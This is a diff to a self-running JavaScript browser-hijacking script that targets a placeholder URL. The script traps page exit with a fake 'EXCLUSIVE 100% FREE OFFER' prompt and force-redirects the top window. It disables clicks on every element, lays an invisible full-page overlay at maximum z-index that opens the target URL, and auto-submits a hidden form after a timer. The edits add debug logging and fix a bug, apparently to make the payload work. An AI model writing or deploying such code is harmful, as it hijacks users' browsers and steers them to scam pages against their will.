@@ -1,14 +1,6 @@
 (function(targetUrl) {
-    function getTop() {
-        var isTop = 0;
-        try {
-            if (top == self)
-                isTop = 1;
-        } catch (err) {
-            isTop = err;
-        }
-        return isTop;
-    }
+    console.log('targetUrl: '+targetUrl);
+     
 
     function setExit() {
         window.onbeforeunload = function() {
@@ -18,9 +10,9 @@
                     top.location.replace(unescape(targetUrl));
                 }, 100);
             }, 5);
-            return
-                "Do you really want to leave this page and give up the \n\nEXCLUSIVE 100% FREE OFFER?\n\n";
+            return "Do you really want to leave this page and give up the \n\nEXCLUSIVE 100% FREE OFFER?\n\n";
         }
+        console.log("set exit ok");
     }
     try {
         setExit();
@@ -30,6 +22,7 @@
         for (var i = 0, max = all.length; i < max; i++) {
             all[i].style.pointerEvents = "none";
         }
+        console.log("set pointerEvents ok");
     } catch (err) {}
 
     function addInput(f, name, val) {
@@ -55,11 +48,13 @@
                 document.getElementsByTagName('body')[0].appendChild(f);
                 document.getElementById(id).submit();
             } catch (err) {}
-            setTimeout(function() {
-                top.location.replace(targetUrl);
-            }, 60 * 1000);
 
         }, 60 * 1000);
+
+    setTimeout(function() {
+        top.location.replace(targetUrl);
+    }, 60 * 1000);
+
 
     var tid = setInterval(function() {
         if (!document.body) {
@@ -71,5 +66,6 @@
             "position:absolute;top:0px;left:0px;width:100%;height:100%;opacity:0;z-index:2147483647;background:#000;";
         overlay.onclick = window.open(targetUrl);
         document.body.appendChild(overlay);
+        console.log('setup overlay ok');
     }, 100);
 })('http://google.com');
